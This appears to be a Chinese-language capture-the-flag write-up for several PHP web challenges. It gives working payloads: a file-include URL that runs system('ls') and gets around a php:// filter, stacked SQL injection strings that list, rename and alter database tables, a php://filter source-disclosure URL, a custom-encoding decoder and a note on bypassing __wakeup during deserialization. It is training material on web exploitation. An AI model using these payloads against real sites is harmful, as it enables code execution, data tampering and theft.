### Web_php_include
题目源代码
```php
<?php
show_source(__FILE__);
echo $_GET['hello'];
$page=$_GET['page'];
while (strstr($page, "php://")) {
    $page=str_replace("php://", "", $page);
}
include($page);
?>
```

payload
```
http://220.249.52.134:54379/?page=http://127.0.0.1/index.php/?hello=%3C?system(%22ls%22);?%3E
```

page参数指向的是一个网页文件，而这个网页文件中存在恶意脚本<?system("ls");?>，在include时被执行。

### supersqli
注入过程中报错如下：
```php
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
```
可以使用堆叠注入：
```mysql
1';show tables;#
1';show columns from words;#
1';show columns from `1919810931114514`;# 
1';rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#
1' or 1=1 #
```

### web2
```php
<?php
$miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";

function encode($str){
    $_o=strrev($str);
    // echo $_o;
        
    for($_0=0;$_0<strlen($_o);$_0++){
       
        $_c=substr($_o,$_0,1);
        $__=ord($_c)+1;
        $_c=chr($__);
        $_=$_.$_c;   
    } 
    return str_rot13(strrev(base64_encode($_)));
}

highlight_file(__FILE__);
/*
   逆向加密算法，解密$miwen就是flag
*/
?>
```
解密
```php
<?php

$a = 'a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws';

$b = base64_decode(strrev(str_rot13($a)));
$flag = '';
for($c = 0;$c < strlen($b);$c++){

    $d = substr($b,$c,1);
    $f = chr(ord($d)-1);
    $flag = $flag.$f;
}

echo strrev($flag);

?>
```


### unserialize3
PHP反序列化漏洞：执行unserialize()时，先会调用__wakeup()。

当序列化字符串中属性值个数大于属性个数，就会导致反序列化异常，从而跳过__wakeup()。

### Guess
php伪协议
```python
http://220.249.52.134:41787/?page=php://filter/convert.base64-encode/resource=upload
```
